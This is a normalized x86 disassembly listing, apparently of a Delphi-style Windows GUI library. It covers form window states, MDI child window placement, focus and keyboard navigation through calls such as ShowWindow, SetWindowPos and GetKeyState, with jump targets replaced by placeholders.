mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_496868
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x284 ] 0x2
jmp r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x284 ] 0x1
mov [ ebx + 0x284 ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
movzx eax [ ebx + 0x284 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_496868
push eax
call ShowWindow
mov [ ebx + 0x284 ] 0x0
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
pop esi
pop ebx
retn
sub_47d020
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x287 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_496868
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_47c320
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov dl 0x1
mov si 0xffd1
call sub_4483f8
sub_47d078
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x278 ]
call sub_496e84
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_47d0a4
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_47c384
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_47d0c0
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_46761c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_46761c
sub_47d100
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x158 ] 0x1
jne r-xdata
cmp [ esi + 0x158 ] 0x0
jne r-xdata
cmp [ esi + 0x160 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x15c ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_47d138
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x158 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x15c ]
call sub_449d2c
mov [ edx ] 0x1
mov eax [ ebx + 0x160 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_47d16c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47d2b5
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d2bc
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0xd ] 0x1
push ebp
mov eax [ esi + 0x2a0 ]
call sub_47d0c0
pop ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_48a70c
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_48d98c
push ebp
mov eax [ esi + 0x7c ]
call sub_47d0c0
pop ecx
mov [ ebp - 0xc ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_47d100
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_482c20
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and ecx 0xffff
mov eax [ ebp - 0x14 ]
shl eax 0x10
or ecx eax
mov edx 0xd
mov eax [ rw-data ]
call sub_482ca8
mov ecx [ ebp - 0xc ]
mov edx 0x8
mov eax [ rw-data ]
call sub_482ca8
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0xd ]
mov eax ebx
call sub_47d138
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax ebx
call sub_48d98c
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_482b90
test [ esi + 0x280 ] 0x8
je r-xdata
sub_47d2c4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x282 ] 0x0
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x8 ]
mov edi eax
mov eax [ esi + 0x70 ]
lea edx [ edi + 0x18 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jbe r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea edx [ edi + 0x20 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jbe r-xdata
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea eax [ edi + 0x20 ]
push eax
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x1c ]
lea edx [ edi + 0x18 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ edx + 0x4 ] ecx
sub_47d338
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x354 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_47d364
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x18 ]
and eax 0x8000
cmp eax 0x8000
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x350 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e46c
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4949e0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x364 ]
mov eax esi
call sub_483fc4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp eax [ ebx + 0x14 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edi eax
sub edi [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
sub edx [ eax + 0x4c ]
mov ebx edx
test edi edi
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov esi ebx
mov eax [ ebp - 0x4 ]
call sub_47a7e8
lea edx [ ebp - 0x34 ]
call sub_47f314
push ebp
lea eax [ esi + 0x8 ]
xor ecx ecx
mov edx [ ebp - 0x34 ]
call sub_47d338
pop ecx
push ebp
lea eax [ esi + 0xc ]
xor ecx ecx
mov edx [ ebp - 0x30 ]
call sub_47d338
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
call sub_47d338
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x28 ]
call sub_47d338
pop ecx
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_432a2c
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x10 ]
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
add [ ebp - 0x18 ] ebx
mov eax [ ebp - 0x20 ]
sub eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x368 ] 0x1
jmp r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
cmp edx eax
jle r-xdata
mov [ ebp - 0x18 ] eax
test edi edi
jle r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
add [ ebp - 0x1c ] edi
sub eax edi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x368 ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call InvalidateRect
mov [ ebp - 0x1c ] eax
sub_47d548
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_497808
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x2a0 ] 0x0
je r-xdata
mov eax [ ebx + 0x2a0 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x2a0 ]
mov eax [ eax + 0x34 ]
call sub_466084
test eax eax
jle r-xdata
mov ebx [ esi + 0x8 ]
push 0xf
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebx + 0x4 ] eax
sub_47d5a0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x374 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_4483f8
pop esi
pop ebx
retn
sub_47d5e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_495bf8
movzx eax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x278 ]
mov eax ebx
call sub_496e84
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x278 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
movzx edx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_496e84
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_47d680
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47dce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_483168
mov eax [ ebp - 0x4 ]
or [ eax + 0x374 ] 0x4
xor edx edx
push ebp
push sub_47dcc5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dccc
mov eax [ ebp - 0x4 ]
and [ eax + 0x374 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_47db97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4488a4#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x4
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47c3d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4805fc
mov ebx [ ebp - 0xc ]
sub ebx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d878
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x288 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_496868
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
mov esi [ ebp - 0x8 ]
sub esi [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d8bc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
call sub_476cdc
mov ebx eax
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x283 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x283 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_47f634
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d878
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_47f604
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f610
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x283 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push DefMDIChildProcW
call CallWindowProcW
mov eax [ ebp - 0x4 ]
call sub_48e210
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
push 0x3
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_47f61c
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d8bc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_47f5f8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax esi
call sub_479168
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_47afd4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_47f628
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
jge r-xdata
adc esi 0x0
add ebx eax
mov eax esi
call sub_479188
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_47f610
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_47f610
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f610
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47afd4
jmp r-xdata
sub_47d73d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_482674
call sub_448cfc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x6
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4805fc
mov ebx [ ebp - 0xc ]
sub ebx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d878
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x288 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov esi [ ebp - 0x8 ]
sub esi [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d8bc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x288 ] 0x7
jne r-xdata
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ rw-data ]
call sub_47f610
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_47f61c
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x283 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x283 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_47f634
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d878
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_47f604
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f610
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dccc
mov eax [ ebp - 0x4 ]
and [ eax + 0x374 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x283 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push DefMDIChildProcW
call CallWindowProcW
mov eax [ ebp - 0x4 ]
call sub_48e210
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
push 0x3
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_47f61c
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_48d8bc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_47f5f8
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax esi
call sub_479168
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_47afd4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_47f628
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_47f61c
cmp ebx eax
